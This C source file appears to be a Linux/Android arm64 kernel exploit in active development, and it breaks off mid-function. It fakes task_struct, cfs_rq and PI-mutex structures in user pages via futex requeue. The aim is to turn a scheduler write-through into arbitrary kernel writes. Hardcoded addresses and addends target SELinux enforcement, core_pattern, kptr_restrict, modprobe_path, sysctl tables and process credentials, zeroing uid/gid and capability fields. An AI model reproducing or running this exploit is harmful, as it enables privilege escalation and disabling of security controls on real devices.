#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/un.h>
#include <time.h>
#include <unistd.h>

#define E1_PPOLL_NFDS 14
#define INJECT_FIRST_PAGE_BYTES 104
#define MAP_PAGES 64
#define STALL_PAGE 8
#define TR "/sys/kernel/tracing"
#define PAGE 4096UL
#define PAGE_OFFSET 0xffffff8000000000ULL
#define MEMSTART_ADDR 0x80000000ULL
#define MUTEX_OFF 0x40UL
#define MAGIC "E1C6R2D"
/* 8.21: lock-only overlay. leftover.lock = page mutex, leftover.task = 0
 * so the file page is not aliased as a task_struct. Dummy waiter at +0x80
 * stays (empty-tree Oops guard). */
static int g_lock_only = 0; /* 8.21: task=0 Oopsed the device. keep leftover.task=kva. */
/* 8.70: this-boot (c59df5bf) fair_sched_class. 8.25/8.27 old slides DEAD. */
#define LIVE_BOOT_ID "487f42a3-3096-4ab4-90fd-6cdb7d746de7"
#define LIVE_FAIR_CLASS 0xffffffda64210ab8ULL
/* this-boot = nokaslr + 0x2bf8200000. enforcing is ldarb/strb at state+0.
 * status_page at +0x10, status_lock at +0x18, avc* at +0x48. size 0x88. */
#define LIVE_SELINUX_STATE 0xffffffda64ff9990ULL
#define LIVE_PMUS_SRCU_SKIP 0xffffffda65313580ULL
/* 8.31: core_pattern is 0x80-byte .data string, 8-byte aligned.
 * sysctl reads "core\n"; kernel buffer is "core\0\0\0\0".
 * ADD 0x3643314500000000 => "coreE1C6". Do NOT retarget selinux (would wrap). */
#define LIVE_CORE_PATTERN 0xffffffda651568e0ULL
#define CORE_PATTERN_ADDEND 0x3643314500000000ULL
/* 8.32: aligned 8-byte at debug_locks_silent covers kptr_restrict in the
 * high u32. silent@+0xa0, kptr@+0xa4, ptr_key@+0xa8 is OUTSIDE.
 * kptr=2 => addend = -(2ull<<32) => kptr=0, silent unchanged.
 * Do NOT retarget selinux or core_pattern. */
#define LIVE_KPTR_SLOT 0xffffffda64d3dca0ULL
#define LIVE_G_BOOT_STATE 0xDEADULL /* 8.111 Oopsed: .data..ro_after_init is RO, do not write */
#define KPTR_ADDEND 0xfffffffe00000000ULL
/* 8.34: 8.33 left modprobe[0:8] as scrambled leftover, NOT zeros.
 * orig8 = 45 a4 a5 9f c2 74 c0 c3 = 0xc3c074c29fa5a445
 * want  = "E1C6OK!!"             = 0x21214b4f36433145
 * addend = want - orig            = 0x5d60d68c969d8d00
 * tail "dprobe" must stay. Do NOT retarget selinux/core/kptr. */
#define LIVE_MODPROBE_PATH 0xffffffda650a4660ULL
#define MODPROBE_ADDEND 0x5d60d68c969d8d00ULL /* "E1C6OK!!" - scrambled */
/* 8.35: this-boot KS mm of holding e1c5 pid 23935, double-leak match.
 * dest = mm->total_vm @ +0xd0 (proc_pid_statm first field).
 * Do NOT retarget selinux/core/kptr/modprobe. Do NOT write mm+0x348. */
#define LIVE_MM 0xffffff8c47ba1c00ULL /* 8.70: new holder pid 20316 */
#define LIVE_MM_TOTAL_VM (LIVE_MM + 0xd0ULL)
#define MM_TV_ADDEND 0xE1C6ULL
/* 8.36 dead: kern_table is mixed files+dirs so register_leaf_sysctl_tables
 * kmalloc-copies file entries; static panic_print slot is not procfs.
 * 8.37: vm_table is files-only (38 files, 0 dirs) so the static table IS
 * the registered ctl_table. Retarget vm_table[33] user_reserve_kbytes
 * .data (maxlen=8, extra1=extra2=0, proc_doulongvec_minmax) to known
 * mm->total_vm. Do NOT cat this sysctl before the write. Do NOT write
 * owner. Do NOT smash handler@+0x20. Do NOT retarget panic_print again. */
#define LIVE_VM_TABLE 0xffffffda64d61990ULL
#define LIVE_USER_RESERVE_SLOT 0xffffffda64d621d8ULL /* vm_table[33]+8 */
#define LIVE_USER_RESERVE_DATA 0xffffffda64d3b5e0ULL /* orig data ptr */
#define MM_TV_RETARGET_ADDEND 0xffffffb423e666f0ULL /* orig data -> mm+0xd0 */
#define MM_TV_RESTORE_ADDEND  0x4bdc199910ULL /* mm+0xd0 -> orig data */
#define MM_OWNER_FROM_TV_ADDEND 0x278ULL /* mm+0xd0 -> mm+0x348 */
/* 8.71: sysctl slot -> new holder mm+0xd0 confirm-read.
 * dest is user_reserve data pointer, NOT mm owner. Do NOT ADD total_vm.
 * Do NOT write mm+0x348. Holder 20316. */
#define LIVE_CRED 0xffffff89737770c0ULL /* holder 17128, 8.43 */
#define LIVE_CRED_SGID_EUID (LIVE_CRED + 0x10ULL)
#define LIVE_CRED_UID_GID (LIVE_CRED + 0x04ULL)
#define LIVE_CRED_GID_SUID (LIVE_CRED + 0x08ULL)
#define CRED_GID_SUID_ZERO_ADDEND 0xfffff82ffffff830ULL /* 8.50 done */
#define LIVE_CRED_EGID_FSUID (LIVE_CRED + 0x18ULL)
#define CRED_EGID_FSUID_RETARGET_ADDEND 0xffffff9d7043baf8ULL /* orig data -> cred+0x18 */
#define CRED_EGID_FSUID_RESTORE_ADDEND  0x628fbc4508ULL /* cred+0x18 -> orig data */
#define CRED_EGID_FSUID_ZERO_ADDEND 0xfffff82ffffff830ULL /* 8.52 done */
#define LIVE_CRED_FSGID_SEC (LIVE_CRED + 0x20ULL)
#define CRED_FSGID_SEC_RETARGET_ADDEND 0xffffff9d7043bb00ULL /* orig data -> cred+0x20 */
#define CRED_FSGID_SEC_RESTORE_ADDEND  0x628fbc4500ULL /* cred+0x20 -> orig data */
#define CRED_FSGID_ONLY_ZERO_ADDEND 0xfffffffffffff830ULL /* 8.54 done */
#define LIVE_CRED_CAP_INH (LIVE_CRED + 0x28ULL)
#define CRED_CAP_INH_RETARGET_ADDEND 0xffffff9d7043bb08ULL /* orig data -> cred+0x28 */
#define CRED_CAP_INH_RESTORE_ADDEND  0x628fbc44f8ULL /* cred+0x28 -> orig data */
#define LIVE_CRED_CAP_PRM (LIVE_CRED + 0x30ULL)
#define CRED_CAP_PRM_RETARGET_ADDEND 0xffffff9d7043bb10ULL /* orig data -> cred+0x30 */
#define CRED_CAP_PRM_RESTORE_ADDEND  0x628fbc44f0ULL /* cred+0x30 -> orig data */
#define LIVE_CRED_CAP_EFF (LIVE_CRED + 0x38ULL)
#define CRED_CAP_EFF_RETARGET_ADDEND 0xffffff9d7043bb18ULL /* orig data -> cred+0x38 */
#define CRED_CAP_EFF_RESTORE_ADDEND  0x628fbc44e8ULL /* cred+0x38 -> orig data */
#define LIVE_CRED_CAP_BSET (LIVE_CRED + 0x40ULL)
#define CRED_CAP_BSET_RETARGET_ADDEND 0xffffff9d7043bb20ULL /* orig data -> cred+0x40 */
#define CRED_CAP_BSET_RESTORE_ADDEND  0x628fbc44e0ULL /* cred+0x40 -> orig data */
#define LIVE_CRED_CAP_AMB (LIVE_CRED + 0x48ULL)
#define CRED_CAP_AMB_RETARGET_ADDEND 0xffffff9d7043bb28ULL /* orig data -> cred+0x48 */
#define CRED_CAP_AMB_RESTORE_ADDEND  0x628fbc44d8ULL /* cred+0x48 -> orig data */
#define LIVE_CRED_POSTCAP (LIVE_CRED + 0x50ULL)
#define CRED_POSTCAP_RETARGET_ADDEND 0xffffff9d7043bb30ULL /* orig data -> cred+0x50 */
#define CRED_POSTCAP_RESTORE_ADDEND  0x628fbc44d0ULL /* cred+0x50 -> orig data */
#define LIVE_CRED_KEYRING (LIVE_CRED + 0x58ULL)
#define CRED_KEYRING_RETARGET_ADDEND 0xffffff9d7043bb38ULL /* orig data -> cred+0x58 */
#define CRED_KEYRING_RESTORE_ADDEND  0x628fbc44c8ULL /* cred+0x58 -> orig data */
#define LIVE_CRED_PKEYRING (LIVE_CRED + 0x60ULL)
#define CRED_PKEYRING_RETARGET_ADDEND 0xffffff9d7043bb40ULL /* orig data -> cred+0x60 */
#define CRED_PKEYRING_RESTORE_ADDEND  0x628fbc44c0ULL /* cred+0x60 -> orig data */
#define LIVE_CRED_TKEYRING (LIVE_CRED + 0x68ULL)
#define CRED_TKEYRING_RETARGET_ADDEND 0xffffff9d7043bb48ULL /* orig data -> cred+0x68 */
#define CRED_TKEYRING_RESTORE_ADDEND  0x628fbc44b8ULL /* cred+0x68 -> orig data */
#define LIVE_CRED_RKEY (LIVE_CRED + 0x70ULL)
#define CRED_RKEY_RETARGET_ADDEND 0xffffff9d7043bb50ULL /* orig data -> cred+0x70 */
#define CRED_RKEY_RESTORE_ADDEND  0x628fbc44b0ULL /* cred+0x70 -> orig data */
#define LIVE_CRED_SECURITY (LIVE_CRED + 0x78ULL)
#define CRED_SECURITY_RETARGET_ADDEND 0xffffff9d7043bb58ULL /* orig data -> cred+0x78 */
#define CRED_SECURITY_RESTORE_ADDEND  0x628fbc44a8ULL /* cred+0x78 -> orig data */
#define LIVE_CRED_USER (LIVE_CRED + 0x80ULL)
#define CRED_USER_RETARGET_ADDEND 0xffffff9d7043bb60ULL /* orig data -> cred+0x80 */
#define CRED_USER_RESTORE_ADDEND  0x628fbc44a0ULL /* cred+0x80 -> orig data */
#define LIVE_CRED_USERNS (LIVE_CRED + 0x88ULL)
#define CRED_USERNS_RETARGET_ADDEND 0xffffff9d7043bb68ULL /* orig data -> cred+0x88 */
#define CRED_USERNS_RESTORE_ADDEND  0x628fbc4498ULL /* cred+0x88 -> orig data */
#define LIVE_CRED_GROUPINFO (LIVE_CRED + 0x90ULL)
#define CRED_GROUPINFO_RETARGET_ADDEND 0xffffff9d7043bb70ULL /* orig data -> cred+0x90 */
#define CRED_GROUPINFO_RESTORE_ADDEND  0x628fbc4490ULL /* cred+0x90 -> orig data */
#define CRED_SGID_EUID_ZERO_ADDEND 0xfffff82ffffff830ULL /* 8.46 done */
#define CRED_UID_GID_RETARGET_ADDEND 0xffffff9d7043bae4ULL /* orig data -> cred+0x04 */
#define CRED_UID_GID_RESTORE_ADDEND  0x628fbc451cULL /* cred+0x04 -> orig data */
#define CRED_USAGE_UID_RETARGET_ADDEND 0xffffff9d7043bae0ULL /* orig data -> cred+0x00 */
#define CRED_USAGE_UID_RESTORE_ADDEND  0x628fbc4520ULL /* cred+0x00 -> orig data */
#define CRED_GID_SUID_RETARGET_ADDEND 0xffffff9d7043bae8ULL /* orig data -> cred+0x08 */
#define CRED_GID_SUID_RESTORE_ADDEND  0x628fbc4518ULL /* cred+0x08 -> orig data */
#define USER_RESERVE_RETARGET_ADDEND 0xffffff94453f46f0ULL /* -> mm+0xd0 */
#define OWNER_FROM_TOTALVM_ADDEND 0x278ULL /* 8.38: +0xd0 -> +0x348 */
#define LIVE_PANIC_PRINT_SLOT 0xffffffec03361118ULL /* 8.36 dead, keep for dump */
#define LIVE_PANIC_PRINT_DATA 0xffffffec035a4238ULL
#define OWNER_RETARGET_ADDEND 0xffffff944518bd10ULL
#define OWNER_TO_TOTALVM_ADDEND 0xfffffffffffffd88ULL
#define OWNER_RESTORE_ADDEND  0x0000006bbae742f0ULL
#ifndef WT_RESTORE
#define WT_RESTORE 0
#endif
static int g_use_live_fair = 0;
/* 8.28: mutex.owner = pageR (zero-shaped, usage planted). BSS owner
 * is unsafe until usage@+0x38 can be pre-written (put_task_struct). */
static int g_owner_is_rq = 0; /* 8.29: owner back on pageT so se.cfs_rq write-thru runs */
static int g_cfs_writethru = 1;
static int g_wt_kdata = 1; /* 1=slot dest default; 0=pageM+0x200 recapture */
static uint64_t g_wt_target;
static uint64_t g_wt_addend = 0x0ULL;
static uint64_t g_wt_dest_override = 0; /* 0 = pick dest from kdata */
static uint64_t g_base_page[512];
static int g_have_base;

static size_t page_sz;
static int g_proxy_fd = -1;
static int g_listen_fd = -1;
static int g_first_bytes = INJECT_FIRST_PAGE_BYTES;
static unsigned long g_task_q;
static unsigned long g_lock_q;
static unsigned long g_kva;
static unsigned long g_pfn;
static int g_page_fd = -1;
static void *g_page;
static void *g_page_task;
static void *g_page_rq;
static unsigned long g_kva_task;
static unsigned long g_kva_rq;
static unsigned long g_pfn_task;
static unsigned long g_pfn_rq;
static uint64_t g_old_class_q;
static uint64_t g_peak_sclass;
static uint64_t g_peak_pitop;
static volatile int g_watch;
static volatile int owner_ready;
static volatile int chain_held;
static volatile int waiter_waiting;
static volatile int requeue_done;
static volatile int stall_held;
static volatile int consumer_started;
static volatile int consumer_done;
static volatile int g_in_ppoll;
static volatile long g_ppoll_ret;
static volatile int g_ppoll_errno;
static volatile long g_consumer_ret;
static volatile int g_consumer_errno;
static volatile pid_t g_owner_tid;
static volatile pid_t g_waiter_tid;
static volatile pid_t g_consumer_tid;
static struct timespec g_ppoll_t0, g_ppoll_t1, g_cons_t0, g_cons_t1;
static uint32_t f_wait, f_target, f_chain;
static FILE *g_watch_fp;
static int g_sclass_fd = -1;
static int g_stall_page = STALL_PAGE;
static void *g_ppoll_area;
static size_t g_ppoll_map_len;
static struct pollfd *g_ppoll_pf;
static volatile long g_wait_requeue_ret;
static volatile int g_wait_requeue_errno;
static struct timespec g_ppoll_ts;
static sigset_t g_ppoll_sigset;
static const struct timespec *g_ppoll_tsp;
static const sigset_t *g_ppoll_sigmask;
static const char *g_depth_name;
static void qstore(void *p, uint64_t v);
static unsigned long with_mte_tag(unsigned long addr, unsigned int tag) {
  return (addr & ~(0xFUL << 56)) | (((unsigned long)(tag & 0xF)) << 56);
}
static void apply_overlay_tag(unsigned int tag) {
  unsigned long kva = g_kva;
  unsigned char *pg = (unsigned char *)g_page;
  g_lock_q = with_mte_tag(kva + MUTEX_OFF, tag);
  if (g_lock_only)
    g_task_q = 0;
  else
    g_task_q = with_mte_tag(kva, tag);
  if (pg) {
    unsigned long dummy = with_mte_tag(kva + 0x80, tag);
    unsigned long self = g_lock_only ? 0 : with_mte_tag(kva, tag);
    unsigned long owner;
    if (g_owner_is_rq && g_kva_rq && !g_lock_only)
      owner = with_mte_tag(g_kva_rq, tag);
    else if (g_kva_task && !g_lock_only)
      owner = with_mte_tag(g_kva_task, tag);
    else
      owner = self;
    qstore(pg + 0x80, 1ULL);
    qstore(pg + 0x88, 0);
    qstore(pg + 0x90, 0);
    qstore(pg + 0x80 + 0x30, self); /* dummy.task = pageM, not owner */
    qstore(pg + 0x80 + 0x38, g_lock_q);
    qstore(pg + MUTEX_OFF + 0x08, dummy);
    qstore(pg + MUTEX_OFF + 0x10, dummy);
    *(uint32_t *)(pg + MUTEX_OFF) = 0;
    /* leftover.task = pageM (nprio@+0x7c). 8.28 mutex.owner = pageR.
     * 8.11: leftover.task == owner livelocks. 8.22 same-page overlap
     * smashed prio and dumped class=0. BSS owner blocked: usage=0
     * -> __put_task_struct. */
    qstore(pg + MUTEX_OFF + 0x18, owner);
    *(uint32_t *)(pg + 0x7c) = 120; /* pi_task nprio < 139 so setprio writes class */
    *(uint32_t *)(pg + 0x84) = 120;
  }
  if (g_page_task && g_kva_task && !g_lock_only) {
    unsigned char *pt = (unsigned char *)g_page_task;
    unsigned long fake_class = with_mte_tag(g_kva_task + 0x200, tag);
    unsigned long old_class = fake_class;
    memset(pt, 0, PAGE);
    memcpy(pt, "E1C6TSK", 7);
    *(uint32_t *)(pt + 0x10) = 0;     /* thread_info.cpu */
    *(uint32_t *)(pt + 0x38) = 0x100; /* usage, block __put_task_struct */
    *(uint32_t *)(pt + 0x3c) = 0;     /* task flags */
    *(uint32_t *)(pt + 0x78) = 0;     /* on_rq */
    *(uint32_t *)(pt + 0x7c) = 139;   /* normal_prio */
    *(uint32_t *)(pt + 0x80) = 139;   /* static_prio */
    *(uint32_t *)(pt + 0x84) = 139;   /* prio */
    /* 8.27: plant this-boot fair as *old* class. prio 120 => new is also
     * fair, so setprio cmp old==new skips switched_from/switched_to.
     * Fake CFS stays as belt-and-braces if the skip misses. Never plant
     * 8.25's 0xffffffd6d4e10ab8. */
    /* 8.29 writethru needs switched_to_fair, so old class must NOT be fair. */
    if (g_use_live_fair && !g_cfs_writethru)
      old_class = (unsigned long)LIVE_FAIR_CLASS;
    qstore(pt + 0x90, old_class);
    memset(pt + 0x7a8, 0, 16);
    memcpy(pt + 0x7a8, "r0fake", 6);
    g_old_class_q = old_class;
    printf("[r2d] plant oldclass=0x%lx live=%d (fake_vtable=0x%lx)\n",
           old_class, g_use_live_fair, fake_class);
    if (g_page_rq && g_kva_rq) {
      unsigned char *pr = (unsigned char *)g_page_rq;
      unsigned long cfs = with_mte_tag(g_kva_rq, tag);
      unsigned long rq = with_mte_tag(g_kva_rq + 0x200, tag);
      memset(pr, 0, PAGE);
      memcpy(pr, "E1C6CFS", 7);
      qstore(pr + 0x130, rq);          /* cfs_rq->rq */
      *(uint32_t *)(pr + 0x138) = 1;   /* throttle/on_list: propagate parent=NULL ret */
      *(uint32_t *)(pr + 0x200 + 0xac8) = 4; /* rq->clock skip, avoid WARN+BRK */
      qstore(pt + 0x210, cfs);         /* se.cfs_rq */
      /* se.parent @ +0x208 already 0 */
      if (g_cfs_writethru && g_kva) {
        /* attach_entity_cfs_rq: atomic-add (load-last) to (cfs_rq+0x150)+0x140.
         * 8.29 dest was pageM+0x200 (EL0-readable proof).
         * 8.30 dest is kernel BSS selinux_state.enforcing, NO MTE tag. */
        unsigned long target;
        unsigned long tg;
        if (g_wt_dest_override)
          target = (unsigned long)g_wt_dest_override;
        else if (g_wt_kdata)
          target = (unsigned long)LIVE_USER_RESERVE_SLOT;
        else
          target = with_mte_tag(g_kva + 0x200, tag);
        tg = target - 0x140;
        g_wt_target = target;
        qstore(pr + 0xa0, g_wt_addend); /* load */
        qstore(pr + 0x100, 0);          /* last */
        qstore(pr + 0x150, tg);         /* tg; add lands at tg+0x140 */
        printf("[r2d] writethru restore=%d kdata=%d load=0x%llx tg=0x%lx dest=0x%lx srcu_skip=0x%llx\n",
               WT_RESTORE,
               g_wt_kdata, (unsigned long long)g_wt_addend, tg, target,
               (unsigned long long)LIVE_PMUS_SRCU_SKIP);
      }
      if (g_owner_is_rq) {
        unsigned long rq_class = g_use_live_fair
                                     ? (unsigned long)LIVE_FAIR_CLASS
                                     : with_mte_tag(g_kva_rq + 0x300, tag);
        *(uint32_t *)(pr + 0x10) = 0;
        *(uint32_t *)(pr + 0x38) = 0x100; /* usage, block __put_task_struct */
        *(uint32_t *)(pr + 0x78) = 0;
        *(uint32_t *)(pr + 0x7c) = 139;
        *(uint32_t *)(pr + 0x80) = 139;
        *(uint32_t *)(pr + 0x84) = 139;
        qstore(pr + 0x90, rq_class);
        memset(pr + 0x7a8, 0, 16);
        memcpy(pr + 0x7a8, "r0rq", 4);
        g_old_class_q = rq_class;
        printf("[r2d] 8.28 owner=pageR class=0x%lx usage=0x100 comm=r0rq\n", rq_class);
      }
      printf("[r2d] cfs=0x%lx rq=0x%lx se.cfs_rq@+0x210\n", cfs, rq);
    }
  }
  printf("[r2d] apply tag=0x%x lock_only=%d task=0x%lx lock=0x%lx owner=0x%lx oldclass=0x%llx stall_page=%d\n",
         tag, g_lock_only, g_task_q, g_lock_q,
         (unsigned long)(g_kva_task ? with_mte_tag(g_kva_task, tag) : 0),
         (unsigned long long)g_old_class_q, g_stall_page);
}
static volatile uint32_t g_peak_wlock;
static volatile uint64_t g_peak_left;
static volatile uint64_t g_peak_rb;
static volatile int g_saw_change;

static long ns_delta(const struct timespec *a, const struct timespec *b) {
  return (b->tv_sec - a->tv_sec) * 1000000000L + (b->tv_nsec - a->tv_nsec);
}

static pid_t mytid(void) { return (pid_t)syscall(SYS_gettid); }

static int wr_sys(const char *path, const char *val) {
  int fd = open(path, O_WRONLY);
  if (fd < 0) {
    printf("[r2d] open %s errno=%d\n", path, errno);
    return -1;
  }
  ssize_t n = write(fd, val, strlen(val));
  int e = errno;
  close(fd);
  if (n < 0) {
    printf("[r2d] write %s errno=%d\n", path, e);
    return -1;
  }
  return 0;
}

static int rd_sys(const char *path, char *buf, size_t n) {
  int fd = open(path, O_RDONLY);
  if (fd < 0) {
    printf("[r2d] read-open %s errno=%d\n", path, errno);
    if (n) buf[0] = 0;
    return -1;
  }
  ssize_t r = read(fd, buf, n ? n - 1 : 0);
  int e = errno;
  close(fd);
  if (r < 0) {
    printf("[r2d] read %s errno=%d\n", path, e);
    if (n) buf[0] = 0;
    return -1;
  }
  if (n) {
    buf[r] = 0;
    while (r > 0 && (buf[r - 1] == '\n' || buf[r - 1] == '\r' || buf[r - 1] == ' '))
      buf[--r] = 0;
  }
  return 0;
}

static int clear_trace(void) {
  /* 5.15 tracing_open() resets the ring only on O_TRUNC (echo > trace).
     write() is tracing_write_stub and does not clear. 8.16 leftover run
     wrote "\n" without O_TRUNC and grepped a stale 24-line buffer. */
  int fd = open(TR "/trace", O_WRONLY | O_TRUNC);
  if (fd < 0) {
    printf("[r2d] clear_trace open errno=%d\n", errno);
    return -1;
  }
  close(fd);
  return 0;
}

static void print_sys_state(const char *tag) {
  char on[32], en[32], bufsz[64];
  rd_sys(TR "/tracing_on", on, sizeof(on));
  rd_sys(TR "/events/filemap/mm_filemap_add_to_page_cache/enable", en, sizeof(en));
  rd_sys(TR "/buffer_size_kb", bufsz, sizeof(bufsz));
  printf("[r2d] sys %s tracing_on=%s filemap_en=%s buffer_size_kb=%s\n",
         tag, on, en, bufsz);
}

static int ino_token_in_line(const char *line, const char *token) {
  const char *p = strstr(line, token);
  if (!p) return 0;
  char c = p[strlen(token)];
  return c == 0 || c == ' ' || c == '\t';
}

static int wr_file(const char *path, const char *val) {
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
  if (fd < 0) return -1;
  ssize_t n = write(fd, val, strlen(val));
  close(fd);
  return n < 0 ? -1 : 0;
}

static long ftx(uint32_t *uaddr, int op, uint32_t val,
                const struct timespec *arg4, uint32_t *uaddr2) {
  return syscall(SYS_futex, uaddr, op, val, arg4, uaddr2, 0);
}

static void print_ret(const char *name, long ret, int saved) {
  printf("[r2d] %s ret=%ld errno=%d\n", name, ret, saved);
}

static uint64_t qload(const void *p) {
  uint64_t v;
  memcpy(&v, p, 8);
  return v;
}

static void qstore(void *p, uint64_t v) { memcpy(p, &v, 8); }

static int is_kptr(uint64_t v) {
  return (v >> 40) == 0xffffffULL;
}

static const char *kptr_class(uint64_t v) {
  /* nokaslr _text=0xffffffc008000000, kimage is tens of MB.
     0xffffffc00xxxxxxx is the only plausible text/data slide window. */
  if (v >= 0xffffffc000000000ULL && v < 0xffffffc040000000ULL)
    return "KIMAGE";
  if (v >= 0xffffffc040000000ULL && v < 0xffffffc100000000ULL)
    return "VMAP";
  if (v >= 0xffffff8000000000ULL && v < 0xffffff9000000000ULL)
    return "PHYSMAP";
  if ((v >> 48) == 0xffffULL)
    return "OTHERKERN";
  return "NON";
}

static void snapshot_page(void) {
  unsigned char *p = (unsigned char *)g_page;
  int i;
  if (!p) return;
  for (i = 0; i < 512; i++)
    g_base_page[i] = qload(p + (size_t)i * 8);
  g_have_base = 1;
  printf("[r2d] snapshot 4096 bytes from page=%p\n", g_page);
}

static void scan_page_kptrs(const char *tag) {
  unsigned char *p = (unsigned char *)g_page;
  int i, nk = 0, nd = 0, nkimage = 0;
  if (!p) return;
  for (i = 0; i < 512; i++) {
    uint64_t v = qload(p + (size_t)i * 8);
    uint64_t old = g_have_base ? g_base_page[i] : 0;
    int changed = g_have_base && v != old;
    if (is_kptr(v)) {
      const char *cls = kptr_class(v);
      printf("[r2d] kptr %s off=0x%03x val=0x%016llx class=%s%s\n",
             tag, i * 8, (unsigned long long)v, cls,
             changed ? " DIFF" : "");
      nk++;
      if (cls[0] == 'K') nkimage++;
    } else if (changed) {
      printf("[r2d] diff %s off=0x%03x old=0x%016llx new=0x%016llx\n",
             tag, i * 8, (unsigned long long)old, (unsigned long long)v);
      nd++;
    }
  }
  printf("[r2d] kptr-scan %s count=%d kimage=%d other_diff=%d lock_only=%d\n",
         tag, nk, nkimage, nd, g_lock_only);
}

static void dump_mem_raw(const char *tag, const void *mem) {
  char path[128];
  FILE *fp;
  if (!mem) return;
  snprintf(path, sizeof(path), "/data/local/tmp/e1c6_page_%s.bin", tag);
  fp = fopen(path, "wb");
  if (!fp) return;
  fwrite(mem, 1, 4096, fp);
  fflush(fp);
  fsync(fileno(fp));
  fclose(fp);
}
static void dump_page_raw(const char *tag) {
  dump_mem_raw(tag, g_page);
}
static void dump_sclass_txt(uint64_t sc, uint64_t pitop) {
  char buf[128];
  int n = snprintf(buf, sizeof(buf), "sclass=0x%llx pitop=0x%llx old=0x%llx\n",
                   (unsigned long long)sc, (unsigned long long)pitop,
                   (unsigned long long)g_old_class_q);
  if (g_sclass_fd >= 0) {
    lseek(g_sclass_fd, 0, SEEK_SET);
    write(g_sclass_fd, buf, (size_t)n);
    fsync(g_sclass_fd);
  } else {
    FILE *fp = fopen("/data/local/tmp/e1c6_sclass.txt", "w");
    if (!fp) return;
    fwrite(buf, 1, (size_t)n, fp);
    fflush(fp);
    fsync(fileno(fp));
    fclose(fp);
  }
}

static void *class_watch_thread(void *unused) {
  unsigned char *pt;
  uint64_t planted;
  cpu_set_t set;
  (void)unused;
  CPU_ZERO(&set);
  CPU_SET(7, &set);
  sched_setaffinity(0, sizeof(set), &set);
  setpriority(PRIO_PROCESS, 0, -20);
  pt = (unsigned char *)(g_owner_is_rq && g_page_rq ? g_page_rq : g_page_task);
  planted = g_old_class_q;
  while (__atomic_load_n(&g_watch, __ATOMIC_SEQ_CST)) {
    uint64_t sc;
    uint64_t pitop;
    uint32_t nprio;
    if (!pt) continue;
    sc = *(volatile uint64_t *)(pt + 0x90);
    pitop = *(volatile uint64_t *)(pt + 0x8a8);
    nprio = *(volatile uint32_t *)(pt + 0x7c);
    /* 8.27 old==new leaves sclass unchanged; fire on nprio/pitop too. */
    if ((sc && sc != planted) || pitop || nprio != 139) {
      dump_sclass_txt(sc, pitop);
      dump_mem_raw("watch-task", g_page_task);
      dump_page_raw("watch-mutex-at-class");
      dump_mem_raw("watch-rq", g_page_rq);
      dump_mem_raw("watch-owner", pt);
      g_peak_sclass = sc;
      g_peak_pitop = pitop;
      g_saw_change = 1;
      break;
    }
  }
  return NULL;
}

static void dump_page(const char *tag) {
  unsigned char *p = (unsigned char *)g_page;
  if (!p) {
    printf("[r2d] dump %s page=null\n", tag);
    return;
  }
  printf("[r2d] dump %s mag=%.7s "
         "wlock=0x%08x rb_root=0x%016llx leftmost=0x%016llx owner=0x%016llx "
         "q00=0x%016llx q08=0x%016llx\n",
         tag, (char *)p, (unsigned)(*(uint32_t *)(p + MUTEX_OFF)),
         (unsigned long long)qload(p + MUTEX_OFF + 8),
         (unsigned long long)qload(p + MUTEX_OFF + 0x10),
         (unsigned long long)qload(p + MUTEX_OFF + 0x18),
         (unsigned long long)qload(p), (unsigned long long)qload(p + 8));
  /* leftover.task currently aliases this page. Print task_struct slots
     and dummy waiter in case hop-2 wrote prio/sched_class/pi_top_task. */
  printf("[r2d] taskslots %s on_rq=0x%x prio=0x%x nprio=0x%x sclass=0x%016llx "
         "pi_top=0x%016llx pi_lock=0x%08x pi_waiters=0x%016llx pi_blocked=0x%016llx\n",
         tag, (unsigned)(*(uint32_t *)(p + 0x78)),
         (unsigned)(*(uint32_t *)(p + 0x84)),
         (unsigned)(*(uint32_t *)(p + 0x7c)),
         (unsigned long long)qload(p + 0x90),
         (unsigned long long)qload(p + 0x8a8),
         (unsigned)(*(uint32_t *)(p + 0x884)),
         (unsigned long long)qload(p + 0x898),
         (unsigned long long)qload(p + 0x8b0));
  printf("[r2d] dummy %s pcolor=0x%llx right=0x%llx left=0x%llx task=0x%llx lock=0x%llx\n",
         tag, (unsigned long long)qload(p + 0x80),
         (unsigned long long)qload(p + 0x88),
         (unsigned long long)qload(p + 0x90),
         (unsigned long long)qload(p + 0x80 + 0x30),
         (unsigned long long)qload(p + 0x80 + 0x38));
  if (g_page_task) {
    unsigned char *pt = (unsigned char *)g_page_task;
    printf("[r2d] faketask %s on_rq=0x%x prio=0x%x nprio=0x%x sclass=0x%016llx "
           "pi_top=0x%016llx usage=0x%x comm=%.16s\n",
           tag, (unsigned)(*(uint32_t *)(pt + 0x78)),
           (unsigned)(*(uint32_t *)(pt + 0x84)),
           (unsigned)(*(uint32_t *)(pt + 0x7c)),
           (unsigned long long)qload(pt + 0x90),
           (unsigned long long)qload(pt + 0x8a8),
           (unsigned)(*(uint32_t *)(pt + 0x38)),
           (char *)(pt + 0x7a8));
  }
  {
    char enf[8] = {0};
    unsigned char st[20];
    int stfd;
    rd_sys("/sys/fs/selinux/enforce", enf, sizeof(enf));
    stfd = open("/sys/fs/selinux/status", O_RDONLY);
    memset(st, 0, sizeof(st));
    if (stfd >= 0) {
      read(stfd, st, sizeof(st));
      close(stfd);
    }
    {
      char core[32] = {0};
      char kptr[8] = {0};
      char modp[32] = {0};
      char ppr[48] = {0};
      rd_sys("/proc/sys/kernel/core_pattern", core, sizeof(core));
      rd_sys("/proc/sys/kernel/kptr_restrict", kptr, sizeof(kptr));
      rd_sys("/proc/sys/kernel/modprobe", modp, sizeof(modp));
      rd_sys("/proc/sys/kernel/panic_print", ppr, sizeof(ppr));
      printf("[r2d] wt %s pageM+0x200=0x%016llx dest=0x%llx kdata=%d enforce=%s status_enf=%u core=%s kptr=%s modprobe=%s panic_print=%s\n",
             tag, (unsigned long long)qload((unsigned char *)g_page + 0x200),
             (unsigned long long)g_wt_target, g_wt_kdata,
             enf[0] ? enf : "?", (unsigned)st[8],
             core[0] ? core : "?", kptr[0] ? kptr : "?",
             modp[0] ? modp : "(empty)", ppr[0] ? ppr : "0");
    }
  }
  if (g_page_rq) {
    unsigned char *pr = (unsigned char *)g_page_rq;
